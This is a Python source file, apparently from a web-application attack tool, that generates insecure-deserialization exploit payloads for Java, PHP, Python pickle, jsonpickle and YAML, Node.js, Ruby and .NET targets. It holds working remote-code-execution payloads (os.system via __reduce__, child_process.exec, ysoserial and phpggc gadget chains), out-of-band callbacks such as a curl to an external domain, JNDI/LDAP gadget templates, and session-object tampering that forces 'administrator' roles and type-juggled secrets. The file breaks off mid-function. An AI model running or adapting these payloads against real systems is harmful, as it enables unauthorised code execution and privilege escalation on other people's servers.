import subprocess
import base64
import os
import re
import pickle
import sys
import urllib.request
from urllib.parse import urlparse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tool_config import get_tool_path, get_oob_domain
from Utility.schemas import ExploitResult, MutationVector, Mutations, MutationPayload

_JAVA_AVAILABLE: bool | None = None


def _java_available() -> bool:
    """Whether a JRE is on PATH. Checked once and cached — without it, every
    ysoserial attempt would spawn a failing subprocess, flooding logs and making
    a large scan crawl."""
    global _JAVA_AVAILABLE
    if _JAVA_AVAILABLE is None:
        try:
            subprocess.run(["java", "-version"], capture_output=True, timeout=5)
            _JAVA_AVAILABLE = True
        except Exception:
            _JAVA_AVAILABLE = False
    return _JAVA_AVAILABLE


class PayloadMutation:

    YSOSERIAL_PATH = get_tool_path("ysoserial")

    TEST_COMMANDS = ["id", "whoami", "hostname"]

    JAVA_CHAIN_MAP = {
        "CommonsCollections": [ 
            "CommonsCollections6",
            "CommonsCollections1",
            "CommonsCollections4",
        ],
        "TemplatesImpl": [
            "Jdk7u21",
            "CommonsCollections4",
        ],
        "Spring": [
            "Spring1",
            "Spring2",
        ],
        "Groovy": [
            "Groovy1",
        ],
        "JNDI": [
            "CommonsCollections6",
            "Spring1",
        ],
        "Rome": [
            "ROME",
        ],
    }

    def __init__(self, exploit_result: ExploitResult, vector: MutationVector) -> None:
        self.exploit = exploit_result
        self.vector  = vector
        self.probe: str = exploit_result.get("suggested_probe") or ""
        self.etype: str = exploit_result.get("exploit_type") or ""

    def mutate(self) -> Mutations:
        if self.probe == "ysoserial":
            return self._mutate_java()
        if self.probe == "urldns_probe":
            return self._mutate_java_urldns() + self._mutate_java_rce_escalation()
        if self.probe in ("gadget_chain", "magic_method"):
            return self._php_mutation()
        if self.probe in ("flip_boolean", "modify_string","modify_integer"):
            return self.__mutated_php_choose() + [m for m in self._php_mutation() if "error" not in m]
        if self.probe == "pickle_exec":
            return self._mutate_pickle() + self._mutate_pickle_oob()
        if self.probe == "jsonpickle_exec":
            return self._mutate_jsonpickle()
        if self.probe == "yaml_exec":
            return self._mutate_yaml()
        if self.probe in ("node_serialize", "proto_pollution"):
            return self._mutate_nodejs()
        if self.probe == "ruby_marshal":
            return self._mutate_ruby()
        if self.probe in ("viewstate", "dotnet_deser"):
            return self._mutate_dotnet_viewstate()
        if self.probe == "jsonnet":
            return self._mutate_dotnet_jsonnet()
        if self.probe in ("rce", "phar_deser", "ssrf", "php_input", "lfi", "code_inject", "traversal", "stream"):
            return self._mutate_wrapper()
        if self.probe == "jackson_manual":
            return self._mutate_jackson_oob()
        return []


    def _resolve_chains(self) -> list[str]:
        for key, chains in self.JAVA_CHAIN_MAP.items():
            if key.lower() in self.etype.lower():
                return chains
        return ["CommonsCollections6", "CommonsCollections1", "Spring1"]

    def _get_java_flags(self) -> list[str]:
        try:
            result = subprocess.run(
                ["java", "-version"],
                capture_output=True,
                text=True
            )
            output = result.stderr + result.stdout
            if '"1.' in output:
                return []   
            return [
                "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
                "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
                "--add-opens=java.base/java.net=ALL-UNNAMED",
                "--add-opens=java.base/java.util=ALL-UNNAMED",
                "--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED",
            ]
        except Exception:
            return []

    def _run_ysoserial(self, chain: str, command: str) -> str | None:
        if not os.path.exists(self.YSOSERIAL_PATH):
            return None
        if not _java_available():
            return None
        try:
            flags = self._get_java_flags()
            cmd   = ["java"] + flags + ["-jar", self.YSOSERIAL_PATH, chain, command]

            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=15
            )

            if result.returncode == 0 and result.stdout:
                return base64.b64encode(result.stdout).decode()

            return None

        except subprocess.TimeoutExpired:
            print(f"[!] Timeout: {chain}")
            return None
        except (FileNotFoundError, PermissionError, OSError) as e:
            print(f"[!] Could not run java/ysoserial: {e}")
            return None

    def _make_payload(self, ptype: str, chain: str | None, command: str | None, b64: str) -> MutationPayload:
        
        url_safe = b64.replace('+', '%2B').replace('=', '%3D').replace('/', '%2F')

        return {
            "type":              ptype,
            "chain":             chain,
            "command":           command,
            "payload":           b64,
            "payload_urlencoded": url_safe,
            "location":          self.vector.get("location"),
            "name":              self.vector.get("name"),
            "url":               self.vector.get("url"),
            "method":            self.vector.get("method"),
            "encoding":          "base64",
            "encoding_chain":    self.vector.get("encoding_chain") or [],
            "request_context":   self.vector.get("request_context"),
            "transform_chain":   self.vector.get("transform_chain"),
            "slot_value":        self.vector.get("slot_value"),
        }

    def _mutate_java(self) -> Mutations:
        results: Mutations = []
        chains  = self._resolve_chains()

        if not os.path.exists(self.YSOSERIAL_PATH):
            return [{
                "error":   "ysoserial-all.jar not found",
                "hint":    f"Place ysoserial-all.jar at: {os.path.abspath(self.YSOSERIAL_PATH)}",
                "command": f"java -jar ysoserial-all.jar {chains[0]} 'id' > payload.ser"
            }]

        for chain in chains:
            for cmd in self.TEST_COMMANDS:
                print(f"[*] Trying {chain} -> {cmd}")
                b64 = self._run_ysoserial(chain, cmd)
                if b64:
                    results.append(self._make_payload("java_deser", chain, cmd, b64))
                    print(f"[+] Generated: {chain}")
                else:
                    print(f"[-] Failed: {chain}")

        if not results:
            return [{
                "error": "ysoserial-all.jar found but could not execute any chain",
                "hint": "Check that 'java' is installed and on PATH (run 'java -version' to verify)",
                "command": f"java -jar {os.path.abspath(self.YSOSERIAL_PATH)} {chains[0]} 'id'",
            }]

        return results


    def _mutate_java_urldns(self) -> Mutations:
        if not os.path.exists(self.YSOSERIAL_PATH):
            return [{
                "error": "ysoserial-all.jar not found",
                "hint":  "java -jar ysoserial-all.jar URLDNS 'http://YOUR_CANARY' | base64"
            }]

        oob_domain = get_oob_domain()
        if oob_domain:
            canary = f"http://{oob_domain}"
            note = f"Configured OOB domain — check {oob_domain}'s interaction log for a DNS/HTTP callback"
        else:
            canary = "http://canary.REPLACE_WITH_YOUR_INTERACTSH_DOMAIN.com"
            note = "No OOB domain configured — set 'oob_domain' in config.json (or ETHICALQUOC_OOB_DOMAIN) to your Interactsh/Burp Collaborator subdomain"

        b64 = self._run_ysoserial("URLDNS", canary)

        if b64:
            payload = self._make_payload("java_urldns", "URLDNS", canary, b64)
            payload["note"] = note
            return [payload]

        return []

    RCE_ESCALATION_OOB_COMMANDS = [
        "nslookup {domain}",
        "curl http://{domain}/cc-rce-confirmed",
    ]

    def _mutate_java_rce_escalation(self) -> Mutations:
        if not os.path.exists(self.YSOSERIAL_PATH):
            return []

        oob_domain = get_oob_domain()
        if not oob_domain:
            return []

        results: Mutations = []
        for chain in self._resolve_chains():
            for cmd_template in self.RCE_ESCALATION_OOB_COMMANDS:
                command = cmd_template.format(domain=oob_domain)
                b64 = self._run_ysoserial(chain, command)
                if b64:
                    payload = self._make_payload("java_rce_escalation", chain, command, b64)
                    payload["note"] = (
                        f"Escalated from unconfirmed Java deserialization (no specific gadget keyword "
                        f"matched) — check {oob_domain}'s interaction log for an inbound DNS/HTTP "
                        "callback to confirm this gadget chain actually executed on the target"
                    )
                    results.append(payload)

        return results


    JACKSON_OOB_GADGETS = [
        ("com.sun.rowset.JdbcRowSetImpl", '["com.sun.rowset.JdbcRowSetImpl",{{"dataSourceName":"ldap://{domain}/a","autoCommit":true}}]'),
        ("org.springframework.beans.factory.config.PropertyPathFactoryBean",
         '["org.springframework.beans.factory.config.PropertyPathFactoryBean",'
         '{{"targetBeanName":"ldap://{domain}/a","propertyPath":"foo",'
         '"beanFactory":["org.springframework.jndi.support.SimpleJndiBeanFactory",'
         '{{"shareableResources":["ldap://{domain}/a"]}}]}}]'),
        ("com.mchange.v2.c3p0.JndiRefForwardingDataSource",
         '["com.mchange.v2.c3p0.JndiRefForwardingDataSource",'
         '{{"jndiName":"ldap://{domain}/a","loginTimeout":"0"}}]'),
    ]

    JACKSON_OOB_GADGETS_GENERIC_BYPASS = [
        ("java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>",
         '["java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>",'
         '[{{"dataSourceName":"ldap://{domain}/a","autoCommit":true}}]]'),
        ("java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>",
         '["java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>",'
         '[{{"targetBeanName":"ldap://{domain}/a","propertyPath":"foo",'
         '"beanFactory":["org.springframework.jndi.support.SimpleJndiBeanFactory",'
         '{{"shareableResources":["ldap://{domain}/a"]}}]}}]]'),
        ("java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>",
         '["java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>",'
         '[{{"jndiName":"ldap://{domain}/a","loginTimeout":"0"}}]]'),
    ]

    def _mutate_jackson_oob(self) -> Mutations:
        oob_domain = get_oob_domain()
        if not oob_domain:
            return [{
                "error": "No OOB domain configured",
                "hint": "Set 'oob_domain' in config.json (or ETHICALQUOC_OOB_DOMAIN) to your Interactsh/Burp Collaborator subdomain",
            }]

        results: Mutations = []
        all_gadgets = self.JACKSON_OOB_GADGETS + self.JACKSON_OOB_GADGETS_GENERIC_BYPASS
        for gadget_class, template in all_gadgets:
            raw = template.format(domain=oob_domain)
            b64 = base64.b64encode(raw.encode()).decode()
            payload = self._make_payload("jackson_oob", gadget_class, None, b64)
            payload["payload_raw"] = raw
            payload["note"] = (
                f"Jackson default/polymorphic typing confirmation only — check {oob_domain}'s "
                "interaction log for an inbound LDAP/DNS callback. This does NOT achieve RCE by "
                "itself: a real exploit additionally needs a rogue LDAP/RMI server returning a "
                "Reference plus a hosted malicious class, which this tool does not provide or run"
            )
            results.append(payload)

        return results



    PHPGGC_PATH = get_tool_path("phpggc")
    
    PHP_GADGET_CHAINS_MAP = {
    "monolog": [
        "Monolog/FW1",
        "Monolog/RCE1",
        "Monolog/RCE2",
        "Monolog/RCE3",
        "Monolog/RCE4",
        "Monolog/RCE5",
        "Monolog/RCE6",
        "Monolog/RCE7",
        "Monolog/RCE8",
        "Monolog/RCE9",
    ],
    "guzzle": [
        "Guzzle/FW1",
        "Guzzle/INFO1",
        "Guzzle/RCE1",
    ],
    "swiftmailer": [
        "SwiftMailer/FD1",
        "SwiftMailer/FD2",
        "SwiftMailer/FR1",
        "SwiftMailer/FW1",
        "SwiftMailer/FW2",
        "SwiftMailer/FW3",
        "SwiftMailer/FW4",
    ],
    "laravel": [
        "Laravel/FD1",
        "Laravel/RCE1",
        "Laravel/RCE2",
        "Laravel/RCE3",
        "Laravel/RCE4",
        "Laravel/RCE5",
        "Laravel/RCE6",
        "Laravel/RCE7",
        "Laravel/RCE8",
        "Laravel/RCE9",
        "Laravel/RCE10",
        "Laravel/RCE11",
        "Laravel/RCE12",
        "Laravel/RCE13",
        "Laravel/RCE14",
        "Laravel/RCE15",
        "Laravel/RCE16",
        "Laravel/RCE17",
        "Laravel/RCE18",
        "Laravel/RCE19",
        "Laravel/RCE20",
        "Laravel/RCE21",
        "Laravel/RCE22",
    ],
    "symfony": [
        "Symfony/FD1",
        "Symfony/FW1",
        "Symfony/FW2",
        "Symfony/RCE1",
        "Symfony/RCE2",
        "Symfony/RCE3",
        "Symfony/RCE4",
        "Symfony/RCE5",
        "Symfony/RCE6",
        "Symfony/RCE7",
        "Symfony/RCE8",
        "Symfony/RCE9",
        "Symfony/RCE10",
        "Symfony/RCE11",
        "Symfony/RCE12",
        "Symfony/RCE13",
        "Symfony/RCE14",
        "Symfony/RCE15",
        "Symfony/RCE16",
    ],
    "yii": [
        "Yii/RCE1",
        "Yii/RCE2",
        "Yii2/RCE1",
        "Yii2/RCE2",
    ],
    "zend": [
        "ZendFramework/FD1",
        "ZendFramework/RCE1",
        "ZendFramework/RCE2",
        "ZendFramework/RCE3",
        "ZendFramework/RCE4",
        "ZendFramework/RCE5",
    ],
    "codeigniter": [
        "CodeIgniter4/FD1",
        "CodeIgniter4/FD2",
        "CodeIgniter4/FR1",
        "CodeIgniter4/RCE1",
        "CodeIgniter4/RCE2",
        "CodeIgniter4/RCE3",
        "CodeIgniter4/RCE4",
        "CodeIgniter4/RCE5",
        "CodeIgniter4/RCE6",
    ],
    "slim": [
        "Slim/RCE1",
    ],
    "wordpress": [
        "WordPress/RCE1",
        "WordPress/RCE2",
        "WordPress/Dompdf/RCE1",
        "WordPress/Dompdf/RCE2",
        "WordPress/Guzzle/RCE1",
        "WordPress/Guzzle/RCE2",
        "WordPress/P/WooCommerce/RCE1",
        "WordPress/P/WooCommerce/RCE2",
        "WordPress/P/YoastSEO/FW1",
    ],
    "drupal": [
        "Drupal/AT1",
        "Drupal/FD1",
        "Drupal/RCE1",
        "Drupal/SQLI1",
        "Drupal/SSRF1",
        "Drupal/XXE1",
        "Drupal7/FD1",
        "Drupal7/RCE1",
        "Drupal7/SQLI1",
        "Drupal7/SSRF1",
        "Drupal9/RCE1",
    ],
    "joomla": [
        "Joomla/FW1",
    ],
    "doctrine": [
        "Doctrine/FW1",
        "Doctrine/FW2",
        "Doctrine/RCE1",
        "Doctrine/RCE2",
    ],
    "thinkphp": [
        "ThinkPHP/FW1",
        "ThinkPHP/FW2",
        "ThinkPHP/RCE1",
        "ThinkPHP/RCE2",
        "ThinkPHP/RCE3",
        "ThinkPHP/RCE4",
    ],
    "typo3": [
        "Typo3/FD1",
    ],
    "cakephp": [
        "CakePHP/RCE1",
        "CakePHP/RCE2",
    ],
    "magento": [
        "Magento/FW1",
        "Magento/SQLI1",
        "Magento2/FD1",
        "Magento2/FD2",
    ],
}
    PHP_TYPE = {
        "system",
        "exec",
        "passthru",
        "unlink"
    }

    # Blind phpggc gadgets: the embedded command never echoes into the
    # response (black-box oracle only sees status + body diff), so id/whoami/
    # hostname would produce identical 500s — 3x the subprocess+replay cost for
    # zero extra signal. One canary command is enough. (PHP-only; the shared
    # TEST_COMMANDS still drives Java/Pickle/etc.)
    PHP_TEST_COMMANDS = ["whoami"]
    
    
    def _get_php_version(self) -> str:
        try:
            result = subprocess.run(["php", "-version"], capture_output=True, text=True)
            output = result.stdout + result.stderr
            if "PHP 5." in output: return "5"
            if "PHP 7." in output: return "7"
            if "PHP 8." in output: return "8"
            return "unknown"
        except Exception:
            return "unknown"
        
    def _php_mutation(self) -> Mutations:
        results: Mutations = []
        
        chains = self.__resolve_php_chain()
        if not os.path.exists(self.PHPGGC_PATH):
            return [{
                "error": "phpggc not found",
                "hint":  f"Place phpggc at: {self.PHPGGC_PATH}"
            }] 
        for chain in chains:
            for ptype in self.PHP_TYPE:
                for cmd in self.PHP_TEST_COMMANDS:
                    result = self._run_phpggc(chain, ptype, cmd)
                    if result:
                        results.append(self._make_payload("php_object", chain, cmd, result))
                        print(f"[+] Generated: {chain}")

        if not results:
            return [{
                "error": "phpggc found but could not execute any chain",
                "hint": "Check that 'php' is installed and on PATH (run 'php -version' to verify)",
                "command": f"php {self.PHPGGC_PATH} {chains[0]} system id -b",
            }]

        return results
    
    
    def _run_phpggc(self, chain: str,type:str, command: str) -> str | None:
        try:
            cmd   = ["php"]  + [self.PHPGGC_PATH, chain,type, command,"-b"]
            result = subprocess.run(cmd, capture_output=True, timeout=15)

            if result.returncode == 0 and result.stdout:
                return result.stdout.decode().strip()
            return None
        except subprocess.TimeoutExpired:
            print(f"[!] Timeout: {chain}")
            return None
        except (subprocess.SubprocessError, OSError, UnicodeDecodeError) as e:
            print(f"[!] Could not run php/phpggc: {e}")
            return None
        
    def __resolve_php_chain(self) -> list[str]:
        for key, chain in self.PHP_GADGET_CHAINS_MAP.items():
            if key.lower() in self.etype.lower() and chain:
                return chain
        return ["Monolog/RCE1", "Laravel/RCE1", "Symfony/RCE1"]
    
    
    def _read_php_token(self, payload: str, pos: int) -> dict | None:
        if pos >= len(payload):
            return None
        kind = payload[pos]
        if kind == 's':
            m = re.match(r's:(\d+):"', payload[pos:])
            if not m:
                return None
            declared = int(m.group(1))
            content_start = pos + m.end()
            content_end = content_start + declared
            if content_end + 2 > len(payload) or payload[content_end:content_end + 2] != '";':
                return None
            return {
                "start": pos, "end": content_end + 2, "kind": "s",
                "content": payload[content_start:content_end],
            }
        if kind in ("i", "d"):
            m = re.match(r"[id]:[^;]*;", payload[pos:])
            if not m:
                return None
            return {"start": pos, "end": pos + m.end(), "kind": kind}
        if kind == "b":
            m = re.match(r"b:[01];", payload[pos:])
            if not m:
                return None
            return {"start": pos, "end": pos + m.end(), "kind": "b"}
        if kind == "N":
            m = re.match(r"N;", payload[pos:])
            if not m:
                return None
            return {"start": pos, "end": pos + m.end(), "kind": "N"}
        if kind in ("a", "O"):
            brace = payload.find("{", pos)
            if brace == -1:
                return None
            depth = 1
            i = brace + 1
            while i < len(payload) and depth > 0:
                if payload[i] == "{":
                    depth += 1
                elif payload[i] == "}":
                    depth -= 1
                i += 1
            if depth != 0:
                return None
            return {"start": pos, "end": i, "kind": kind}
        return None

    def _iter_php_pairs(
        self, payload: str, start: int = 0, end: int | None = None, depth: int = 0
    ) -> list[tuple[dict | None, dict]]:
        if depth > 20:
            return []
        if end is None:
            end = len(payload)

        body_start = payload.find("{", start, end)
        if body_start == -1:
            val_tok = self._read_php_token(payload, start)
            return [(None, val_tok)] if val_tok else []

        pos = body_start + 1
        pairs: list[tuple[dict | None, dict]] = []
        while pos < end and payload[pos] != "}":
            key_tok = self._read_php_token(payload, pos)
            if key_tok is None:
                break
            pos = key_tok["end"]
            val_tok = self._read_php_token(payload, pos)
            if val_tok is None:
                break
            pos = val_tok["end"]
            if val_tok["kind"] in ("a", "O"):
                pairs.extend(self._iter_php_pairs(payload, val_tok["start"], val_tok["end"], depth + 1))
            else:
                pairs.append((key_tok, val_tok))
        return pairs

    MODIFY_STRING_HINTS = [
        "username", "user", "email", "login", "name",
        "role", "admin", "level", "access", "privilege",
        "taikhoan", "tendangnhap", "nguoidung", "dangnhap",
        "vaitro", "quantri", "quyen", "capdo", "truycap",
    ]
    TOKEN_HINTS = [
        "token", "secret", "key", "access", "auth", "session",
        "sig", "hash", "csrf", "nonce", "password", "pass", "api",
    ]

    def __type_juggle(self, payload: str) -> Mutations:
        results: Mutations = []
        string_vals = [(k, v) for (k, v) in self._iter_php_pairs(payload) if v["kind"] == "s"]

        for key_tok, val_tok in string_vals:
            if key_tok is None or not any(h in key_tok["content"].lower() for h in self.TOKEN_HINTS):
                continue
            mutated = payload[:val_tok["start"]] + "i:0;" + payload[val_tok["end"]:]
            encode_mutated = base64.b64encode(mutated.encode()).decode()
            p = self._make_payload("type_juggle", f'{key_tok["content"]}->i:0', None, encode_mutated)
            p["note"] = "PHP type juggling: token/secret string field changed to integer 0 (0 == non-numeric string is true in PHP < 8.0)"
            results.append(p)

        priv = next((kv for kv in string_vals if kv[0]
                     and any(h in kv[0]["content"].lower() for h in self.MODIFY_STRING_HINTS)), None)
        secret = next((kv for kv in string_vals if kv[0]
                       and any(h in kv[0]["content"].lower() for h in self.TOKEN_HINTS)), None)
        if priv and secret and priv[1]["start"] != secret[1]["start"]:
            repls = [
                (priv[1], f's:{len("administrator")}:"administrator";'),
                (secret[1], "i:0;"),
            ]
            mutated = payload
            for val_tok, new_tok in sorted(repls, key=lambda r: r[0]["start"], reverse=True):
                mutated = mutated[:val_tok["start"]] + new_tok + mutated[val_tok["end"]:]
            encode_mutated = base64.b64encode(mutated.encode()).decode()
            p = self._make_payload(
                "type_juggle_privesc",
                f'{priv[0]["content"]}=administrator + {secret[0]["content"]}=i:0',
                None, encode_mutated,
            )
            p["note"] = ("Combined privilege escalation: privilege field -> 'administrator' AND "
                         "secret/token field type-juggled to integer 0 (PHP loose-compare bypass)")
            results.append(p)

        return results

    def __flip_boolean(self, payload: str) -> Mutations:
        results: Mutations = []
        for _key_tok, val_tok in self._iter_php_pairs(payload):
            if val_tok["kind"] != "b":
                continue
            flipped = "1" if payload[val_tok["start"] + 2] == "0" else "0"
            new_token = f"b:{flipped};"
            mutated = payload[:val_tok["start"]] + new_token + payload[val_tok["end"]:]
            encode_mutated = base64.b64encode(mutated.encode()).decode()
            results.append(self._make_payload("flip_boolean", None, None, encode_mutated))
        return results

    def __modify_string(self, payload: str) -> Mutations:
        results: Mutations = []
        test_values = ["administrator", "admin", "root", "superuser"]

        for key_tok, val_tok in self._iter_php_pairs(payload):
            if val_tok["kind"] != "s":
                continue
            if key_tok is None or key_tok["kind"] != "s":
                continue
            if not any(hint in key_tok["content"].lower() for hint in self.MODIFY_STRING_HINTS):
                continue

            original_val = val_tok["content"]
            for new_val in test_values:
                if new_val == original_val:
                    continue
                new_token = f's:{len(new_val)}:"{new_val}";'
                mutated = payload[:val_tok["start"]] + new_token + payload[val_tok["end"]:]
                encode_mutated = base64.b64encode(mutated.encode()).decode()
                results.append(self._make_payload("modify_string", None, None, encode_mutated))

        return results

    def _mutate_integer(self, payload: str) -> Mutations:
        results: Mutations = []
        int_values = [1, 2, 99, 100, 9999]

        for _key_tok, val_tok in self._iter_php_pairs(payload):
            if val_tok["kind"] != "i":
                continue
            m = re.match(r"i:(-?\d+);", payload[val_tok["start"]:val_tok["end"]])
            if not m:
                continue
            original_val = int(m.group(1))
            for new_val in int_values:
                if new_val == original_val:
                    continue
                new_token = f"i:{new_val};"
                mutated = payload[:val_tok["start"]] + new_token + payload[val_tok["end"]:]
                encode_mutated = base64.b64encode(mutated.encode()).decode()
                results.append(self._make_payload("modify_integer", None, None, encode_mutated))

        return results
        
        
        
    def __mutated_php_choose(self) -> Mutations:
        results: Mutations = []
        origin = self.vector.get("value", "")
        if self.probe == "flip_boolean":
            results += self.__flip_boolean(origin)
        if self.probe == "modify_integer":
            results += self._mutate_integer(origin)
        if self.probe == "modify_string":
            results += self.__modify_string(origin)
        results += self.__type_juggle(origin)

        return results


    PICKLE_TEST_COMMANDS = TEST_COMMANDS

    class _PickleRCE:
        def __init__(self, command):
            self.command = command

        def __reduce__(self):
            return (os.system, (self.command,))

    class _PickleOOB:
        def __init__(self, url):
            self.url = url

        def __reduce__(self):
            # urllib.request.urlopen — a pure-Python outbound GET, so no curl/wget needs
            # to exist on the target for the blind callback to fire.
            return (urllib.request.urlopen, (self.url,))

    def _mutate_pickle(self) -> Mutations:
        results: Mutations = []
        for cmd in self.PICKLE_TEST_COMMANDS:
            try:
                raw = pickle.dumps(self._PickleRCE(cmd))
            except Exception:
                continue
            b64 = base64.b64encode(raw).decode()
            payload = self._make_payload("pickle_rce", "os.system via __reduce__", cmd, b64)
            payload["note"] = "Payload is a pickled object whose __reduce__ calls os.system(command)"
            results.append(payload)
        return results

    JSONPICKLE_TEST_COMMANDS = TEST_COMMANDS

    def _jsonpickle_reduce(self, func: str, arg: str) -> str:
        # jsonpickle's py/reduce = [callable, args]: on decode() it calls callable(*args).
        # Verified against the live sink: os.system('id') runs, urllib.urlopen() calls out.
        import json as _json
        return _json.dumps({"py/reduce": [{"py/function": func}, {"py/tuple": [arg]}]})

    def _mutate_jsonpickle(self) -> Mutations:
        """jsonpickle sink mutations — JSON py/reduce payloads (NOT binary pickle). Local
        command variants to probe in-band, plus a blind OOB variant (urllib) when an OOB
        domain is configured."""
        results: Mutations = []
        for cmd in self.JSONPICKLE_TEST_COMMANDS:
            raw = self._jsonpickle_reduce("os.system", cmd)
            b64 = base64.b64encode(raw.encode()).decode()
            payload = self._make_payload("jsonpickle_rce", "py/reduce:os.system", cmd, b64)
            payload["payload_raw"] = raw
            payload["note"] = "jsonpickle.decode() runs py/reduce [os.system, [cmd]] -> RCE"
            results.append(payload)

        oob_domain = get_oob_domain()
        if oob_domain:
            url = f"http://{oob_domain}/"
            raw = self._jsonpickle_reduce("urllib.request.urlopen", url)
            b64 = base64.b64encode(raw.encode()).decode()
            payload = self._make_payload("jsonpickle_oob", "py/reduce:urllib.urlopen", url, b64)
            payload["payload_raw"] = raw
            payload["note"] = (
                f"Blind OOB canary — jsonpickle.decode() fetches {url}; check the collector "
                "log for a callback on this vector's token"
            )
            results.append(payload)
        return results

    def _mutate_pickle_oob(self) -> Mutations:
        """Blind-confirmation variant: a pickle whose __reduce__ makes the target perform
        an outbound HTTP GET to the OOB collector. For blind sinks where the deserialized
        result never appears in the response, the in-band oracle sees nothing — only a hit
        in the collector log (keyed by this vector's token) proves the pickle ran. No-op
        unless an OOB domain/collector is configured."""
        oob_domain = get_oob_domain()
        if not oob_domain:
            return []
        url = f"http://{oob_domain}/"
        try:
            raw = pickle.dumps(self._PickleOOB(url))
        except Exception:
            return []
        b64 = base64.b64encode(raw).decode()
        payload = self._make_payload("pickle_oob", "urllib.urlopen via __reduce__", url, b64)
        payload["note"] = (
            f"Blind OOB canary — on pickle.loads() the target fetches {url}; check the "
            "collector log for a callback on this vector's token to confirm execution"
        )
        return [payload]


    YAML_TEST_COMMANDS = TEST_COMMANDS

    def _mutate_yaml(self) -> Mutations:
        if "java" in self.etype.lower():
            return self._mutate_yaml_java()
        return self._mutate_yaml_python()

    def _mutate_yaml_python(self) -> Mutations:
        results: Mutations = []
        for cmd in self.YAML_TEST_COMMANDS:
            raw = (
                "!!python/object/apply:os.system\n"
                f"args: ['{cmd}']"
            )
            b64 = base64.b64encode(raw.encode()).decode()
            payload = self._make_payload("yaml_rce", "python/object/apply:os.system", cmd, b64)
            payload["payload_raw"] = raw
            payload["note"] = "Requires target to use yaml.load()/yaml.unsafe_load() without SafeLoader"
            results.append(payload)
        return results + self._mutate_yaml_python_oob()

    def _mutate_yaml_python_oob(self) -> Mutations:
        """Blind-confirmation variant for yaml.load()/unsafe_load(): instead of running a
        local command whose output must surface in the response, it makes the target fetch
        the OOB collector (pure-Python urllib — no curl/wget needed). No-op unless OOB set."""
        oob_domain = get_oob_domain()
        if not oob_domain:
            return []
        url = f"http://{oob_domain}/"
        raw = (
            "!!python/object/apply:urllib.request.urlopen\n"
            f"args: ['{url}']"
        )
        b64 = base64.b64encode(raw.encode()).decode()
        payload = self._make_payload("yaml_oob", "python/object/apply:urllib.request.urlopen", url, b64)
        payload["payload_raw"] = raw
        payload["note"] = (
            f"Blind OOB canary — yaml.load()/unsafe_load() fetches {url}; check the collector "
            "log for a callback on this vector's token to confirm the sink executed"
        )
        return [payload]

    def _mutate_yaml_java(self) -> Mutations:
        oob_domain = get_oob_domain()
        if oob_domain:
            target_url = f"http://{oob_domain}/"
            note = (
                f"SnakeYAML (Java) deserialization confirmation — check {oob_domain}'s "
                "interaction log for an inbound HTTP request. For full RCE, host a malicious "
                "META-INF/services/javax.script.ScriptEngineFactory JAR at that URL "
                "(see CVE-2022-1471 writeups) instead of a plain OOB listener."
            )
        else:
            target_url = "http://YOUR_OOB_DOMAIN.burpcollaborator.net/"
            note = (
                "No OOB domain configured — set 'oob_domain' in config.json (or "
                "ETHICALQUOC_OOB_DOMAIN) to your Interactsh/Burp Collaborator URL to receive "
                "the callback and confirm deserialization"
            )
        raw = (
            "!!javax.script.ScriptEngineManager [\n"
            "  !!java.net.URLClassLoader [[\n"
            f'    !!java.net.URL ["{target_url}"]\n'
            "  ]]\n"
            "]"
        )
        b64 = base64.b64encode(raw.encode()).decode()
        payload = self._make_payload(
            "yaml_rce_java", "javax.script.ScriptEngineManager/URLClassLoader", None, b64
        )
        payload["payload_raw"] = raw
        payload["note"] = note
        return [payload]


    NODEJS_TEST_COMMANDS = TEST_COMMANDS

    def _mutate_nodejs(self) -> Mutations:
        results: Mutations = []

        if self.probe == "node_serialize":
            for cmd in self.NODEJS_TEST_COMMANDS:
                raw = (
                    '{"rce":"_$$ND_FUNC$$_function(){'
                    f"require('child_process').exec('{cmd}');"
                    '}()"}'
                )
                b64 = base64.b64encode(raw.encode()).decode()
                payload = self._make_payload("node_serialize_rce", "node-serialize IIFE", cmd, b64)
                payload["payload_raw"] = raw
                payload["note"] = "Requires target to call node-serialize's unserialize() on this JSON"
                results.append(payload)
            return results

        raw = '{"__proto__": {"isAdmin": true, "polluted": true}}'
        b64 = base64.b64encode(raw.encode()).decode()
        payload = self._make_payload("prototype_pollution", "__proto__ injection", None, b64)
        payload["payload_raw"] = raw
        payload["note"] = "Merge/clone of this JSON into an object may pollute Object.prototype"
        results.append(payload)
        return results


    RUBY_TEST_COMMANDS = TEST_COMMANDS

    def _mutate_ruby(self) -> Mutations:
        results: Mutations = []
        for cmd in self.RUBY_TEST_COMMANDS:
            ruby_script = (
                "require 'base64'; "
                "puts Base64.strict_encode64(Marshal.dump("
                f"Object.new.tap {{ |o| o.instance_variable_set(:@cmd, {cmd!r}) }}"
                "))"
            )
            try:
                result = subprocess.run(
                    ["ruby", "-e", ruby_script],
                    capture_output=True, text=True, timeout=15,
                )
            except (subprocess.SubprocessError, OSError, UnicodeDecodeError):
                results.append({
                    "error": "ruby not found, timed out, or produced undecodable output",
                    "hint": "Install Ruby and ensure 'ruby' is on PATH to generate Marshal payloads",
                    "command": f"ruby -e \"puts Base64.strict_encode64(Marshal.dump(...))\"",
                })
                continue

            if result.returncode != 0 or not result.stdout.strip():
                continue

            b64 = result.stdout.strip()
            payload = self._make_payload("ruby_marshal", "Marshal.dump helper", cmd, b64)
            payload["note"] = "Generic Marshal object — replace with a real gadget chain for the target Ruby framework"
            results.append(payload)

        return results


    YSONET_PATH = get_tool_path("ysonet")

    DOTNET_TEST_COMMANDS = TEST_COMMANDS

    DOTNET_GADGETS = [
        "TypeConfuseDelegate",
        "ObjectDataProvider",
        "ActivitySurrogateSelector",
    ]

    DOTNET_FORMATTER_MAP = {
        "binaryformatter": "BinaryFormatter",
        "objectstateformatter": "ObjectStateFormatter",
        "losformatter": "LosFormatter",
        "netdatacontractserializer": "NetDataContractSerializer",
    }

    def _resolve_dotnet_formatter(self) -> str:
